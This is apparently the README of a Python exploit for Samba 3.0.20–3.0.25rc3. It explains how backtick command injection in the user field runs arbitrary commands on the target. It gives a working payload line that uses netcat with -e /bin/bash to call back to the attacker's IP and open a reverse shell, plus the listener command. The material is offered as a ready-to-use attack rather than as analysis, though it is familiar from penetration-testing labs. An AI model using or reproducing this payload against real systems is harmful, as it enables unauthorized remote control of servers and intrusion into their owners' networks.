# Samba-versions-3x-4x-remote-code-execution-exploit-
Easy to read Python script for exploiting Samba versions 3.0.20 through 3.0.25rc3
## How it works and how to use it:
The payload for this script lies in the user field. 
This particular version of samba accepts metacharacters used in shell scripting for command line execution: \`command to run \`
By inserting the ticks into the user field one can execute any command on the target computer. 
```
user = "`" + "nc <YOUR IP ADDRESS> 9999 -e /bin/bash" + "`"
```
In my case I used netcat to gain a remote bash shell on the target computer.
If you intend to do the same, make sure to set up a listening port to catch the bash shell. Example:
```
nc -lvp 9999
```
